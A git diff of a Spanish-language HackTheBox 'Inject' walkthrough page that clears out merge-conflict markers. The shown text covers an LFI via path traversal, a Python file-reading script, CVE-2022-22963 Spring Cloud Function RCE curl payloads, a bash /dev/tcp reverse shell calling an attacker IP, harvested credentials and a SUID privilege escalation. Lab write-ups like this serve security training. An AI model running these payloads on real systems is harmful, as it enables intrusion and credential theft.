@@ -18,11 +18,8 @@
 <meta property="og:locale" content="es" />
 <meta name="language" content="es" />
 
-<<<<<<< HEAD
   <link rel="alternate" hreflang="en" href="https://0x-noname.github.io/writeups/htb/inject/" title="" />
 
-=======
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
 
 
   <meta itemprop="image" content="https://0x-noname.github.io/machines/htb/inject/inject.webp" />
@@ -36,10 +33,6 @@
     
     
     
-<<<<<<< HEAD
-=======
-    
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
 
     <meta property="og:type" content="article" />
     <meta property="og:article:published_time" content=2023-09-12T10:30:15&#43;0200 />
@@ -76,20 +69,12 @@
 
 
 
-<<<<<<< HEAD
 <meta name="generator" content="Hugo 0.125.7">
-=======
-<meta name="generator" content="Hugo 0.111.3">
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
 
     
 
     <link rel="canonical" href="https://0x-noname.github.io/writeups/htb/inject/">
-<<<<<<< HEAD
     <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
-=======
-    <link href="/style.min.0dafdc75467b093a9691e40fa17265d2fe1f3baba37da4faf9af6a1b0b035248.css" rel="stylesheet">
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
@@ -112,7 +97,6 @@
     <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
 
     
-<<<<<<< HEAD
     
   
 
@@ -121,22 +105,13 @@
 
 <script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
 
-=======
-    </head>
-<body data-theme = "" class="notransition">
-<script src="/js/themeLoader.min.3c3396ae9effcbd02e7064baa7b435ffe6560bcd7fec0b428a470d3a128f2220.js"></script>
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
 <div class="navbar" role="navigation">
     <nav class="menu" aria-label="Main Navigation">
         <a href="https://0x-noname.github.io/" class="logo">
             <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
 viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
 stroke-linejoin="round" class="feather feather-home">
-<<<<<<< HEAD
 <title></title>
-=======
-<title>Home</title>
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
 <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
 <polyline points="9 22 9 12 15 12 15 22"></polyline>
 </svg>
@@ -190,11 +165,8 @@ stroke-linejoin="round" class="feather feather-home">
                 <li class="menu-separator">
                     <span>|</span>
                 </li>
-<<<<<<< HEAD
                 
                 
-=======
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
             </ul>
             <a id="mode" href="#">
                 <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
@@ -212,7 +184,6 @@ stroke-linejoin="round" class="feather feather-home">
             <header class="header">
                 <h1 class="header-title">HackTheBox - Inject</h1>
                 
-<<<<<<< HEAD
                 
                 <div class="post-meta">
                     <time datetime="2023-09-12T10:30:15&#43;02:00" itemprop="datePublished"> Sep 12, 2023 </time>
@@ -221,12 +192,6 @@ stroke-linejoin="round" class="feather feather-home">
             </header>
             
             <div class="page-content">
-=======
-                <div class="post-meta">
-                    <time datetime="2023-09-12T10:30:15&#43;02:00" itemprop="datePublished"> Sep 12, 2023 </time>
-                </div>
-            </header><div class="page-content">
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
                 <p><img src="/../machines/htb/inject/inject_logo.webp" alt="logo"></p>
 <ul>
 <li><em>LFI - Directory Traversal</em></li>
@@ -235,7 +200,6 @@ stroke-linejoin="round" class="feather feather-home">
 <li><em>Malicious Ansible Playbook (Privesc)</em></li>
 </ul>
 <h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
-<<<<<<< HEAD
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -p- -T5 -n -v 10.129.184.91
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">PORT     STATE SERVICE
@@ -259,31 +223,6 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">|_  Supported Methods: GET HEAD OPTIONS
 </span></span><span class="line"><span class="cl">|_http-open-proxy: Proxy might be redirecting requests
 </span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-=======
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nmap -p- -T5 -n -v 10.129.184.91
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
-</span></span><span style="display:flex;"><span>22/tcp   open  ssh
-</span></span><span style="display:flex;"><span>8080/tcp open  http-proxy
-</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nmap -sVC -vvv -p 8080,22 10.129.184.91
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>PORT     STATE SERVICE     REASON  VERSION
-</span></span><span style="display:flex;"><span>22/tcp   open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
-</span></span><span style="display:flex;"><span>| ssh-hostkey: 
-</span></span><span style="display:flex;"><span>|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
-</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKZNtFBY2xMX8oDH/EtIMngGHpVX5fyuJLp9ig7NIC9XooaPtK60FoxOLcRr4iccW/9L2GWpp6kT777UzcKtYoijOCtctNClc6tG1hvohEAyXeNunG7GN+Lftc8eb4C6DooZY7oSeO++PgK5oRi3/tg+FSFSi6UZCsjci1NRj/0ywqzl/ytMzq5YoGfzRzIN3HYdFF8RHoW8qs8vcPsEMsbdsy1aGRbslKA2l1qmejyU9cukyGkFjYZsyVj1hEPn9V/uVafdgzNOvopQlg/yozTzN+LZ2rJO7/CCK3cjchnnPZZfeck85k5sw1G5uVGq38qcusfIfCnZlsn2FZzP2BXo5VEoO2IIRudCgJWTzb8urJ6JAWc1h0r6cUlxGdOvSSQQO6Yz1MhN9omUD9r4A5ag4cbI09c1KOnjzIM8hAWlwUDOKlaohgPtSbnZoGuyyHV/oyZu+/1w4HJWJy6urA43u1PFTonOyMkzJZihWNnkHhqrjeVsHTywFPUmTODb8=
-</span></span><span style="display:flex;"><span>|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
-</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIUJSpBOORoHb6HHQkePUztvh85c2F5k5zMDp+hjFhD8VRC2uKJni1FLYkxVPc/yY3Km7Sg1GzTyoGUxvy+EIsg=
-</span></span><span style="display:flex;"><span>|   256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
-</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICZzUvDL0INOklR7AH+iFw+uX+nkJtcw7V+1AsMO9P7p
-</span></span><span style="display:flex;"><span>8080/tcp open  nagios-nsca syn-ack Nagios NSCA
-</span></span><span style="display:flex;"><span>|_http-title: Home
-</span></span><span style="display:flex;"><span>| http-methods: 
-</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD OPTIONS
-</span></span><span style="display:flex;"><span>|_http-open-proxy: Proxy might be redirecting requests
-</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
 </span></span></code></pre></div><h3 id="http-tcp---8080">HTTP TCP - 8080</h3>
 <p><img src="/../machines/htb/inject/web.webp" alt="web"></p>
 <p>Si intento subir un archivo php me responde que sólo puedo subir imágenes, cambiando la extensión a png me dejará subirla y abrirla.</p>
@@ -291,7 +230,6 @@ stroke-linejoin="round" class="feather feather-home">
 <p>Al abrirla me muestra el siguiente error.</p>
 <p><img src="/../machines/htb/inject/uploaded_error.webp" alt="uploaded_error"></p>
 <p>Lanzo curl para ver la petición.</p>
-<<<<<<< HEAD
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl -s &#39;http://10.129.184.91:8080/show_image?img=shell.png&#39;;echo
 </span></span></code></pre></div><p>Me devuelve un archivo json.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">{
@@ -414,130 +352,6 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">.XIM-unix
 </span></span><span class="line"><span class="cl">hsperfdata_frank
 </span></span><span class="line"><span class="cl">pwned
-=======
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl -s &#39;http://10.129.184.91:8080/show_image?img=shell.png&#39;;echo
-</span></span></code></pre></div><p>Me devuelve un archivo json.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  &#34;timestamp&#34;: &#34;2023-03-14T10:22:32.153+00:00&#34;,
-</span></span><span style="display:flex;"><span>  &#34;status&#34;: 500,
-</span></span><span style="display:flex;"><span>  &#34;error&#34;: &#34;Internal Server Error&#34;,
-</span></span><span style="display:flex;"><span>  &#34;message&#34;: &#34;URL [file:/var/www/WebApp/src/main/uploads/shell.png] cannot be resolved in the file system for checking its content length&#34;,
-</span></span><span style="display:flex;"><span>  &#34;path&#34;: &#34;/show_image&#34;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>En el campo <code>message</code> veo una URL interesante.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>&#34;message&#34;: &#34;URL [file:/var/www/WebApp/src/main/uploads/shell.png]
-</span></span></code></pre></div><p>Siguiendo metodología básica obtengo un LFI.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl -s &#39;http://10.129.184.91:8080/show_image?img=/../../../../../../etc/passwd&#39;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
-</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
-</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
-</span></span><span style="display:flex;"><span>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>pollinate:x:110:1::/var/cache/pollinate:/bin/false
-</span></span><span style="display:flex;"><span>usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>frank:x:1000:1000:frank:/home/frank:/bin/bash
-</span></span><span style="display:flex;"><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
-</span></span><span style="display:flex;"><span>sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>phil:x:1001:1001::/home/phil:/bin/bash
-</span></span><span style="display:flex;"><span>fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
-</span></span><span style="display:flex;"><span>_laurel:x:997:996::/var/log/laurel:/bin/false
-</span></span></code></pre></div><p>Para moverme entre directorios creo este sencillo script en <strong>python</strong> ya que tengo la capacidad de listar los directorios y archivos.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.request
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> Ejemplo: &#34;</span> <span style="color:#f92672">+</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; /etc/passwd&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://10.129.184.91:8080/show_image?img=../../../../../..&#34;</span> <span style="color:#f92672">+</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
-</span></span><span style="display:flex;"><span>socket<span style="color:#f92672">.</span>setdefaulttimeout(<span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> urllib<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>urlopen(url) <span style="color:#66d9ef">as</span> response:
-</span></span><span style="display:flex;"><span>        html <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
-</span></span><span style="display:flex;"><span>            data <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">4096</span>)
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> data:
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
-</span></span><span style="display:flex;"><span>            html <span style="color:#f92672">+=</span> data
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> html<span style="color:#f92672">.</span>splitlines():
-</span></span><span style="display:flex;"><span>            print(line<span style="color:#f92672">.</span>decode())
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> urllib<span style="color:#f92672">.</span>error<span style="color:#f92672">.</span>URLError <span style="color:#66d9ef">as</span> e:
-</span></span><span style="display:flex;"><span>    print(e<span style="color:#f92672">.</span>reason)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
-</span></span></code></pre></div><p>Me voy a <code>/var/www</code> y veo el directorio <code>/WebApp</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ ./script.py /var/www
-</span></span><span style="display:flex;"><span>html
-</span></span><span style="display:flex;"><span>WebApp
-</span></span></code></pre></div><p>Listo el contenido de <code>/WebApp</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ ./script.py /var/www/WebApp
-</span></span><span style="display:flex;"><span>.classpath
-</span></span><span style="display:flex;"><span>.DS_Store
-</span></span><span style="display:flex;"><span>.idea
-</span></span><span style="display:flex;"><span>.project
-</span></span><span style="display:flex;"><span>.settings
-</span></span><span style="display:flex;"><span>HELP.md
-</span></span><span style="display:flex;"><span>mvnw
-</span></span><span style="display:flex;"><span>mvnw.cmd
-</span></span><span style="display:flex;"><span>pom.xml
-</span></span><span style="display:flex;"><span>src
-</span></span><span style="display:flex;"><span>target
-</span></span></code></pre></div><p>En el archivo <code>pom.xml</code> veo la versión de spring cloud.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
-</span></span><span style="display:flex;"><span>&lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt;
-</span></span><span style="display:flex;"><span>&lt;version&gt;3.2.2&lt;/version&gt;
-</span></span></code></pre></div><p>Hago una búsqueda en internet y encuentro esta <a href="https://github.com/advisories/GHSA-6v73-fgf6-w5j7">información</a>.</p>
-<p><img src="/../machines/htb/inject/vuln.webp" alt="vuln"></p>
-<p>En este <a href="https://github.com/me2nuk/CVE-2022-22963">repositorio</a> hay un <strong>poc</strong> y sigo los pasos.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>curl -X POST  http://0.0.0.0:8080/functionRouter -H &#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&#34;touch /tmp/pwned&#34;)&#39; --data-raw &#39;data&#39; 
-</span></span></code></pre></div><p>Lanzo curl para crear el archivo <strong>pwned</strong> en el directorio <code>/tmp</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>curl -X POST http://10.129.184.91:8080/functionRouter -H &#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&#34;touch /tmp/pwned&#34;)&#39; --data-raw &#39;data&#39;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  &#34;timestamp&#34;: &#34;2023-03-14T12:49:07.403+00:00&#34;,
-</span></span><span style="display:flex;"><span>  &#34;status&#34;: 500,
-</span></span><span style="display:flex;"><span>  &#34;error&#34;: &#34;Internal Server Error&#34;,
-</span></span><span style="display:flex;"><span>  &#34;message&#34;: &#34;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&#34;,
-</span></span><span style="display:flex;"><span>  &#34;path&#34;: &#34;/functionRouter&#34;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Listo el directorio <code>/tmp</code> y veo que ha creado el archivo <strong>pwned</strong>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ ./script.py /tmp
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>.ICE-unix
-</span></span><span style="display:flex;"><span>.Test-unix
-</span></span><span style="display:flex;"><span>.X11-unix
-</span></span><span style="display:flex;"><span>.XIM-unix
-</span></span><span style="display:flex;"><span>hsperfdata_frank
-</span></span><span style="display:flex;"><span>pwned
->>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
 </span></span></code></pre></div><p>Para la revshell creo un archivo <code>rs</code> y lo comparto desde la máquina atacante.</p>
 <pre tabindex="0"><code>❯ cat rs
 bash -i &gt;&amp; /dev/tcp/10.10.14.85/4444 0&gt;&amp;1
@@ -545,7 +359,6 @@ bash -i &gt;&amp; /dev/tcp/10.10.14.85/4444 0&gt;&amp;1
 ❯ sudo python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 </code></pre><p>Subo el archivo <strong>rs</strong> en el directorio <code>/tmp</code> de la víctima.</p>
-<<<<<<< HEAD
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl -s -X POST http://10.129.184.91:8080/functionRouter -H &#39;spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&#34;curl 10.10.14.85 -o /tmp/rs&#34;)&#39; -d &#39;data&#39;
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">{
@@ -620,82 +433,6 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 </span></span></span></code></pre></div><p>Después de unos minutos <code>/bin/bash</code> tendrá permisos <strong>SUID</strong>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">phil@inject:/opt/automation/tasks$ ls -l /bin/bash
 </span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">1183448</span> Apr <span class="m">18</span>  <span class="m">2022</span> /bin/bash
-=======
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl -s -X POST http://10.129.184.91:8080/functionRouter -H &#39;spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&#34;curl 10.10.14.85 -o /tmp/rs&#34;)&#39; -d &#39;data&#39;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  &#34;timestamp&#34;: &#34;2023-**-**T**:**:**.***+00:00&#34;,
-</span></span><span style="display:flex;"><span>  &#34;status&#34;: 500,
-</span></span><span style="display:flex;"><span>  &#34;error&#34;: &#34;Internal Server Error&#34;,
-</span></span><span style="display:flex;"><span>  &#34;message&#34;: &#34;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&#34;,
-</span></span><span style="display:flex;"><span>  &#34;path&#34;: &#34;/functionRouter&#34;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Verifico que se ha creado el archivo <strong>rs</strong>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ ./script.py /tmp/
-</span></span><span style="display:flex;"><span>.font-unix
-</span></span><span style="display:flex;"><span>.ICE-unix
-</span></span><span style="display:flex;"><span>.Test-unix
-</span></span><span style="display:flex;"><span>.X11-unix
-</span></span><span style="display:flex;"><span>.XIM-unix
-</span></span><span style="display:flex;"><span>hsperfdata_frank
-</span></span><span style="display:flex;"><span>pwned
-</span></span><span style="display:flex;"><span>rs
-</span></span></code></pre></div><p>Ejecuto <strong>bash</strong> y el archivo <strong>rs</strong>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl -s -X POST http://10.129.184.91:8080/functionRouter -H &#39;spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&#34;bash /tmp/rs&#34;)&#39; -d &#39;data&#39;
-</span></span></code></pre></div><p>Obtengo la <strong>shell</strong> como usuario <strong>frank</strong>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nc -lvnp 4444
-</span></span><span style="display:flex;"><span>listening on [any] 4444 ...
-</span></span><span style="display:flex;"><span>connect to [10.10.14.85] from (UNKNOWN) [10.129.184.91] 42836
-</span></span><span style="display:flex;"><span>bash: cannot set terminal process group (807): Inappropriate ioctl for device
-</span></span><span style="display:flex;"><span>bash: no job control in this shell
-</span></span><span style="display:flex;"><span>frank@inject:/$ 
-</span></span></code></pre></div><p>Lanzo un <strong>ls</strong> al home de <strong>frank</strong>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>frank@inject:~$ ls -laR
-</span></span><span style="display:flex;"><span>./.m2:
-</span></span><span style="display:flex;"><span>total 12
-</span></span><span style="display:flex;"><span>drwx------ 2 frank frank 4096 Feb  1 18:38 .
-</span></span><span style="display:flex;"><span>drwxr-xr-x 5 frank frank 4096 Feb  1 18:38 ..
-</span></span><span style="display:flex;"><span>-rw-r----- 1 root  frank  617 Jan 31 16:55 settings.xml
-</span></span></code></pre></div><p>En <code>settings.xml</code> encuentro la contraseña del usuario <strong>phil</strong>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;settings</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://maven.apache.org/POM/4.0.0&#34;</span> <span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xsi:schemaLocation=</span><span style="color:#e6db74">&#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;servers&gt;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;server&gt;</span>
-</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;id&gt;</span>Inject<span style="color:#f92672">&lt;/id&gt;</span>
-</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;username&gt;</span>phil<span style="color:#f92672">&lt;/username&gt;</span>
